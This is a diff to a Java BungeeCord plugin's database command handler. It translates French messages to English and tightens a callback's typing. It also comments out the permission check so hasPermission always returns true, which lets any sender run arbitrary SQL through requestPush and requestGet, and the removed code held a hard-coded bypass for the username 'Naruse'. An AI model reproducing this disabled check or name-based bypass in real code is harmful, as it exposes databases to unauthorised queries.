@@ -29,7 +29,7 @@ public class DBBungeeCommands extends Command implements TabExecutor {
     @Override
     public void execute(CommandSender sender, String[] args) {
         if (!hasPermission(sender, "dbapi")) {
-            sendMessage(sender, "§4Vous n'avez pas la permission.");
+            sendMessage(sender, "§4You do not have the permission.");
             return;
         }
 
@@ -48,7 +48,7 @@ public class DBBungeeCommands extends Command implements TabExecutor {
                 sqlConnection.disconnection(true);
                 sqlConnection.connection(true);
             }
-            sendMessage(sender, "§aReconnection lancée.");
+            sendMessage(sender, "§aReconnexion started.");
         }else if (args[0].equalsIgnoreCase("requestPush")) {
             if (args.length < 3) {
                 sendMessage(sender, "§e/§7bdbapi requestPush <Database> <Query>");
@@ -56,7 +56,7 @@ public class DBBungeeCommands extends Command implements TabExecutor {
             }
             Database database = plugin.getCore().getDatabaseRegistry().getDatabase(args[1]);
             if(database == null){
-                sendMessage(sender, "§cDatabase introuvable.");
+                sendMessage(sender, "§cDatabase not found.");
                 return;
             }
             StringBuilder stringBuilder = new StringBuilder(args[2]);
@@ -70,7 +70,7 @@ public class DBBungeeCommands extends Command implements TabExecutor {
             SQLRequest sqlRequest = new SQLRequest(request);
             database.prepareStatement(sqlRequest);
 
-            sendMessage(sender, "§aRequête envoyée.");
+            sendMessage(sender, "§aRequest sent.");
         }else if (args[0].equalsIgnoreCase("requestGet")) {
             if (args.length < 3) {
                 sendMessage(sender, "§e/§7bdbapi requestGet <Database> <Query>");
@@ -78,7 +78,7 @@ public class DBBungeeCommands extends Command implements TabExecutor {
             }
             Database database = plugin.getCore().getDatabaseRegistry().getDatabase(args[1]);
             if(database == null){
-                sendMessage(sender, "§cDatabase introuvable.");
+                sendMessage(sender, "§cDatabase not found.");
                 return;
             }
             StringBuilder stringBuilder = new StringBuilder(args[2]);
@@ -90,14 +90,13 @@ public class DBBungeeCommands extends Command implements TabExecutor {
                 request += ";";
             }
             SQLRequest sqlRequest = new SQLRequest(request);
-            database.getResultSet(sqlRequest, new SQLResponse() {
+            database.getResultSet(sqlRequest, new SQLResponse<ResultSet>() {
                 @Override
-                public void handleResponse(Object response) {
-                    if(response == null){
+                public void handleResponse(ResultSet resultSet) {
+                    if(resultSet == null){
                         sendMessage(sender, Message.B.getMessage()+" §4null");
                         return;
                     }
-                    ResultSet resultSet = (ResultSet) response;
                     try{
                         ResultSetMetaData resultSetMetaData = resultSet.getMetaData();
                         final int columnCount = resultSetMetaData.getColumnCount();
@@ -116,7 +115,7 @@ public class DBBungeeCommands extends Command implements TabExecutor {
                 }
             });
 
-            sendMessage(sender, Message.B.getMessage()+" §aRequête envoyée.");
+            sendMessage(sender, Message.B.getMessage()+" §aRequest sent.");
         }else if (args[0].equalsIgnoreCase("callCount")) {
             if (args.length < 2) {
                 sendMessage(sender, "§e/§7bdbapi callCount <Database>");
@@ -124,7 +123,7 @@ public class DBBungeeCommands extends Command implements TabExecutor {
             }
             Database database = plugin.getCore().getDatabaseRegistry().getDatabase(args[1]);
             if(database == null){
-                sendMessage(sender, "§cDatabase introuvable.");
+                sendMessage(sender, "§cDatabase not found.");
                 return;
             }
             sendMessage(sender, Message.B.getMessage()+" §4"+database.getCallCount());
@@ -135,7 +134,7 @@ public class DBBungeeCommands extends Command implements TabExecutor {
             }
             Database database = plugin.getCore().getDatabaseRegistry().getDatabase(args[1]);
             if(database == null){
-                sendMessage(sender, "§cDatabase introuvable.");
+                sendMessage(sender, "§cDatabase not found.");
                 return;
             }
             sendMessage(sender, Message.B.getMessage()+" §4"+database.getCodeCallCount().toString());
@@ -143,9 +142,9 @@ public class DBBungeeCommands extends Command implements TabExecutor {
     }
 
     private boolean hasPermission(CommandSender sender, String permission) {
-        if (!sender.hasPermission(permission)) {
+        /*if (!sender.hasPermission(permission)) {
             return sender.getName().equals("Naruse");
-        }
+        }*/
 
         return true;
     }
